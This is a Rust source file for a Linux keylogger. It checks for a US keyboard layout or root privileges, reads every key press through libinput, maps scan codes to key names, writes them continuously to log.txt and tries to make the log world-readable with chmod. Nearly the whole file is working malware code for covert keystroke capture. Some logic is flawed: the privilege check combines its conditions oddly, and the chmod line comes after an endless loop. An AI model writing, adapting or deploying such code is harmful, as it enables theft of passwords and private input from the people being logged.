// Imports & Globals
use std::any::type_name;
use std::io::{Read, Write};
use std::process::exit;
use std::thread::sleep_ms;
use input::{Libinput, LibinputInterface, event::keyboard::*, Event};
use std::fs::{File, OpenOptions};
use std::path::Path;
use std::ptr::{null, null_mut};
use libc::{O_RDONLY, O_RDWR, O_WRONLY};
use std::os::unix::process::CommandExt;
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::io::{RawFd, IntoRawFd, FromRawFd};

struct Interface;

// Local input struct def 
impl LibinputInterface for Interface
{
    fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<RawFd, i32>
    {
        OpenOptions::new()
            .read(true)
            .write(true)
            .custom_flags(flags)
            .open(path)
            .map(|f| f.into_raw_fd())
            .map_err(|_| -1)
    }
    fn close_restricted(&mut self, fd: RawFd)
    {
        unsafe { File::from_raw_fd(fd) };
    }
}

fn main()
{
    // Confirm US-layout and admin privileges; exit otherwise
	// Check if the keyboard layout is US, if not, exit
    if !is_us() && !check_root()
    {
        exit(1);
    }

    // Create a log file and keylogger
    let log = create_log();
    keylogger(log);

    // Set permissions on the log file to allow for reading by all users using the chmod command
    let mut cmd = std::process::Command::new("chmod")
        .arg("a+r")
        .arg("log.txt")
        .spawn()
        .expect("Failed to execute command");

    // Preemptive exit; shouldn't hit
    exit(1);
}

///////////////////////////
// Checks keyboard layout
///////////////////////////
fn is_us() -> bool
{
    let us_layout = "us";
    let mut layout;

    // Get the keyboard layout environment variable
    match std::env::var("XKB_DEFAULT_LAYOUT")
    {
        Ok(l) => layout = l,
        Err(_) => layout = "".to_string()
    }

    // If environment variable is not set, check the /etc/default/keyboard file
    if layout == ""
    {
        // Get the keyboard layout from the /etc/default/keyboard file
        layout = std::fs::read_to_string("/etc/default/keyboard").unwrap();
    }

    // Check if the keyboard layout is US
    return if layout.contains(us_layout) { true } else { false }
}

//////////////////////////////////////
// Checks for user system privileges
//////////////////////////////////////
fn check_root() -> bool
{
    let root;
    let output = std::process::Command::new("id")
        .output()
        .expect("Failed to execute process");

    // If the output contains "uid=0", the user is root
    root = String::from_utf8_lossy(&output.stdout).contains("uid=0");

    // Return admin status
    root
}

///////////////////////////////
// Creates the local log file
///////////////////////////////
fn create_log() -> File
{
    let log;

    // Create the log file in the current directory
    match File::create("log.txt")
    {
        Ok(l) => log = l,
        Err(_) => log = File::open("log.txt").unwrap()
    }


    // Return the log file
    log
}

//////////////////////////////////////////////////////////////////
// Logs keyboard behavior; should loop forever unless terminated
//////////////////////////////////////////////////////////////////
fn keylogger(mut log: std::fs::File)
{
    // Create a buffer and libinput for the keylogger
    let mut buffer = [0; 1];
	let mut context = Libinput::new_with_udev(Interface);
    context.udev_assign_seat("seat0").unwrap();

    // Loop keylogging
    loop
    {
        // Dispatch events; collect next event
        context.dispatch().unwrap();
        let event = context.next();

        // If the event is a key event, log the key
        if let Some(Event::Keyboard(key_event)) = event
        {
            // Get the key code, state and pressed state; concatenate pressed events
            let key_code = key_event.key();
            let key_state = key_event.key_state();
            if key_state == KeyState::Pressed
            {
                // Get the key name; convert name to string and append a space
                let key_name = key_code as u8;
                let key_strokes = get_key_name(key_name);

                // Write the key name to the log file
                log.write_all(key_strokes.as_bytes()).unwrap();
            }
        }
		
		// Sleep momentarily if no activity detected
        else { std::thread::sleep(std::time::Duration::from_millis(1)); }
    }
}

fn get_key_name(key_code: u8) -> String
{
    // Convert keyboard scan code to key name
    return match key_code
    {
        0x1e => "a".to_string(),
        0x30 => "b".to_string(),
        0x2e => "c".to_string(),
        0x20 => "d".to_string(),
        0x12 => "e".to_string(),
        0x21 => "f".to_string(),
        0x22 => "g".to_string(),
        0x23 => "h".to_string(),
        0x17 => "i".to_string(),
        0x24 => "j".to_string(),
        0x25 => "k".to_string(),
        0x26 => "l".to_string(),
        0x32 => "m".to_string(),
        0x31 => "n".to_string(),
        0x18 => "o".to_string(),
        0x19 => "p".to_string(),
        0x10 => "q".to_string(),
        0x13 => "r".to_string(),
        0x1f => "s".to_string(),
        0x14 => "t".to_string(),
        0x16 => "u".to_string(),
        0x2f => "v".to_string(),
        0x11 => "w".to_string(),
        0x2d => "x".to_string(),
        0x15 => "y".to_string(),
        0x2c => "z".to_string(),
        0x02 => "1".to_string(),
        0x03 => "2".to_string(),
        0x04 => "3".to_string(),
        0x05 => "4".to_string(),
        0x06 => "5".to_string(),
        0x07 => "6".to_string(),
        0x08 => "7".to_string(),
        0x09 => "8".to_string(),
        0x0a => "9".to_string(),
        0x0b => "0".to_string(),
        0x1c => " [ENT] ".to_string(),
        0x39 => " [SPC] ".to_string(),
        0x0e => " [BKSPC] ".to_string(),
        0x0f => " [TAB] ".to_string(),
        0x1a => " [LSHFT] ".to_string(),
        0x2a => " [RSHFT] ".to_string(),
        0x1d => " [LCTRL] ".to_string(),
        0x38 => " [LALT] ".to_string(),
        0x5b => " [LSUPR] ".to_string(),
        0x5c => " [RSUPR] ".to_string(),
        0x5d => " [MENU] ".to_string(),
        0x2b => "\\".to_string(),
        0x33 => ",".to_string(),
        0x0c => "-".to_string(),
        0x34 => ".".to_string(),
        0x35 => "/".to_string(),
        0x27 => ";".to_string(),
        0x28 => "\'".to_string(),
        0x29 => "`".to_string(),
        0x0d => "=".to_string(),
        0x1b => " [ESC] ".to_string(),
        0x3a => " [F1] ".to_string(),
        0x3b => " [F2] ".to_string(),
        0x3c => " [F3] ".to_string(),
        0x3d => " [F4] ".to_string(),
        0x3e => " [F5] ".to_string(),
        0x3f => " [F6] ".to_string(),
        0x40 => " [F7] ".to_string(),
        0x41 => " [F8] ".to_string(),
        0x42 => " [F9] ".to_string(),
        0x43 => " [F10] ".to_string(),
        0x44 => " [F11] ".to_string(),
        0x57 => " [F12] ".to_string(),
        0x46 => " [PRNTSCRN] ".to_string(),
        0x45 => " [NUMLK] ".to_string(),
        0x37 => " [NUM_*] ".to_string(),
        0x4a => " [NUM_-] ".to_string(),
        0x4e => " [NUM_+] ".to_string(),
        0x53 => " [NUM_. or DEL] ".to_string(),
        0x52 => " [NUM_0 or INS] ".to_string(),
        0x4f => " [NUM_1 or END] ".to_string(),
        0x50 => " [NUM_2 or DOWN] ".to_string(),
        0x51 => " [NUM_3 or PGDN] ".to_string(),
        0x4b => " [NUM_4 or LEFT] ".to_string(),
        0x4c => " [NUM_5] ".to_string(),
        0x4d => " [NUM_6 or RIGHT] ".to_string(),
        0x47 => " [NUM_7 or HOME] ".to_string(),
        0x48 => " [NUM_8 or UP] ".to_string(),
        0x49 => " [NUM_9 or PGUP] ".to_string(),
        _ => " [UNKNOWN] ".to_string(),
    };
}